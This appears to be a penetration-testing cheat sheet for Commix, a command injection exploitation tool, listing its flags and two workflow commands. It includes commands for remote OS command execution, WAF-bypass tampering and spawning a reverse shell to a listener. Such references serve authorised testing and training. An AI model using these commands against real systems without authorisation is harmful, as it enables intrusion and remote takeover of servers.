# 🛠️ Tool Master Guide: Commix (Command Injection Engine)

> [!INFO] 📋 **Root Metadata**
> - **Tool Name**: Commix (Command Injection Exploitation Tool)
> - **Category**: Automated OS Command Injection Engine (#1 Choice for Command Injection)
> - **License**: Open Source (GPL-3.0)
> - **Installation Command**: `sudo apt update && sudo apt install -y commix`
> - **Binary Path**: `/usr/bin/commix`
> - **Primary Objective**: Automatically discovers and exploits command injection vulnerabilities in web applications, offering automated reverse shell generation and privilege escalation checks.

---

## 📋 1. Exhaustive Flag Reference Matrix

| Flag Category | Flag / Parameter | Description & Technical Function | Syntax Example |
| :--- | :--- | :--- | :--- |
| **Target Spec** | `-u <url>` | Target URL | `commix -u "http://10.10.10.50/ping.php?ip=127.0.0.1"` |
| | `-r <req.txt>` | Parses raw HTTP request file captured from Burp | `commix -r request.txt --parameter="ip"` |
| **Injection** | `--parameter <p>`| Specifies target parameter to test | `commix -r req.txt --parameter="addr"` |
| | `--technique <t>`| Technique (`results-based`, `blind`) | `commix -u URL --technique=r` |
| | `--tamper <t>` | Tamper scripts for WAF bypass | `commix -u URL --tamper=nested_hex` |
| **Shells** | `--os-cmd <cmd>` | Executes single OS command on remote target | `commix -r req.txt --os-cmd="id"` |
| | `--os-shell` | Spawns interactive pseudo-shell | `commix -r req.txt --os-shell` |
| | `--lhost / --lport`| Reverse shell listener parameters | `commix -r req.txt --lhost=10.10.14.2 --lport=4444` |

---

## 💻 2. Practical Operational Workflows

```bash
# 1. Parse HTTP Request File and Test Parameter for Command Injection
commix -r req.txt --parameter="ip_addr"

# 2. Automatically Inject and Spawn Reverse TCP Shell Back to Listener
commix -r req.txt --parameter="ip_addr" --lhost=192.168.1.100 --lport=4444
```
